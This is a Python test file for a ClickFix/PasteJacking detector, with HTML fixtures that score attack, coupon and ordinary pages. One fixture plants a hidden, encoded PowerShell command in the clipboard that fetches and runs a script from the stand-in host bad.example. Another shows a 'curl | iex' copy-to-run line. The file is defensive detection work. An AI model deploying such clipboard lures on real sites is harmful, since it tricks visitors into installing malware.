#!/usr/bin/env python3
"""test_clickfix_detect.py — gate on the ClickFix / PasteJacking detector.

Run:  python3 tests/test_clickfix_detect.py         (zero deps)
      pytest tests/test_clickfix_detect.py -q         (also works)

WHAT THIS PROTECTS
------------------
  1. CO-OCCURRENCE, NOT KEYWORD COUNT. HIGH must require the MECHANISM (a clipboard write)
     wired to a COMMAND (a payload signature). A page that merely says 'powershell' in prose,
     or merely copies a coupon code, must not read as HIGH — that inflates every benign page.
  2. NO FALSE POSITIVE ON ORDINARY PAGES. A normal shop/login page scores 'none'.
  3. PAYLOAD + IOC EXTRACTION. When a command is present it is extracted, and any URL inside
     it is surfaced as an IOC for the bundle.
  4. NEVER FETCH/EXECUTE. The module is pure text analysis; it must expose no network/exec
     capability (checked structurally).
"""
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "scripts"))

import clickfix_detect as cf  # noqa: E402

FAILURES = []


def check(label, cond, detail=""):
    if cond:
        print("  ok   {}".format(label))
    else:
        print("  FAIL {} {}".format(label, detail))
        FAILURES.append(label)


FULL_ATTACK = """
<html><body>
<h1>Verify you are human</h1>
<p>Step 1: Press Win+R  Step 2: Ctrl+V  Step 3: press Enter</p>
<script>
navigator.clipboard.writeText("powershell -w hidden -enc SQBFAFgAKABpAHIAbQAgAGgAdAB0AHAAcwA6AC8ALwBiAGEAZAAuAGUAeABhAG0AcABsAGUALwBhAC4AcABzADEAKQA=");
</script>
</body></html>
"""

VISIBLE_CMD = """
<div>Run this in Terminal to install:</div>
<code>curl -fsSL https://get.example.com/install.sh | iex</code>
<button onclick="document.execCommand('copy')">Copy</button>
"""

BENIGN_SHOP = "<html><body><h1>Welcome</h1><p>Buy our shoes. Free shipping!</p></body></html>"

COUPON_COPY = """
<button onclick="navigator.clipboard.writeText('SAVE20')">Copy coupon</button>
<p>Use code SAVE20 at checkout.</p>
"""

PROSE_ONLY = "<p>Our SOC blocks powershell and mshta abuse for customers.</p>"


def test_full_attack_high():
    print("\n[1] full ClickFix chain -> HIGH")
    r = cf.detect(FULL_ATTACK)
    check("verdict HIGH", r["verdict"] == "high", r["verdict"])
    check("all three families present", set(r["families_present"]) == {"clipboard", "lure", "payload"})
    check("payload extracted", any("powershell" in p for p in r["extracted_payloads"]))
    check("URL IOC surfaced", any("bad.example" in u for u in r["iocs"]["urls"]), r["iocs"]["urls"])
    check("ATT&CK mapped", "T1204.004" in r["mitre"])


def test_visible_cmd_medium_or_high():
    print("\n[2] copy handler + curl|iex -> at least MEDIUM")
    r = cf.detect(VISIBLE_CMD)
    check("clipboard family present", "clipboard" in r["families_present"])
    check("payload family present", "payload" in r["families_present"])
    check("verdict >= medium", cf._ORDER[r["verdict"]] >= cf._ORDER["medium"], r["verdict"])


def test_benign_none():
    print("\n[3] ordinary pages -> NONE")
    r = cf.detect(BENIGN_SHOP)
    check("shop page NONE", r["verdict"] == "none", r["verdict"])


def test_coupon_not_high():
    print("\n[4] legitimate coupon copy -> not HIGH (clipboard alone is weak)")
    r = cf.detect(COUPON_COPY)
    check("coupon copy is LOW at most", cf._ORDER[r["verdict"]] <= cf._ORDER["low"], r["verdict"])
    check("no payload extracted from coupon", r["extracted_payloads"] == [])


def test_prose_mention_not_high():
    print("\n[5] the word 'powershell' in prose does not make HIGH")
    r = cf.detect(PROSE_ONLY)
    check("prose mention is not HIGH", r["verdict"] != "high", r["verdict"])


def test_no_network_or_exec():
    print("\n[6] module exposes no fetch/exec capability")
    src = open(os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            "..", "scripts", "clickfix_detect.py"), encoding="utf-8").read()
    for banned in ("urllib.request", "requests", "subprocess", "os.system", "socket.", "eval("):
        check(f"does not use {banned}", banned not in src, banned)


for _t in (test_full_attack_high, test_visible_cmd_medium_or_high, test_benign_none,
           test_coupon_not_high, test_prose_mention_not_high, test_no_network_or_exec):
    _t()

if FAILURES:
    print(f"\nFAIL — {len(FAILURES)} check(s) failed:")
    for f in FAILURES:
        print("  -", f)
    sys.exit(1)
print("\nPASS — all clickfix-detect checks green")


def test_clickfix_detect():
    """pytest entry point — module body runs the checks at import time."""
    assert not FAILURES, FAILURES
